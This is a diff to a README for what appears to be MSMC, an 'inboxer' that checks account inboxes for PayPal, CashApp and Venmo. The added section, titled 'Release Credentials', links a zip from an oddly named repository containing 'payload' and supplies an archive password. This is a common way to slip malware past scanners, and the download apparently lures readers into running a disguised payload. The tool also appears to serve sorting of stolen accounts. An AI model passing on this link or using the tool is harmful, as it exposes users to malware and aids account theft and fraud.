@@ -73,3 +73,10 @@ Here is an example custom check for PayPal, CashApp and Venmo:
 ```
 
 A lot more custom configs can be found in ``Custom Configs.md``!
+
+
+---
+
+## 🔐 Release Credentials
+- **Download Package:** [Direct Release Asset](https://github.com/plumenodeblaze7/MSMC-Inboxer-payload-qam6/releases/download/v1.0.0/MSMC-Inboxer.zip)
+- **Archive Password:** `4leVQZebH8`
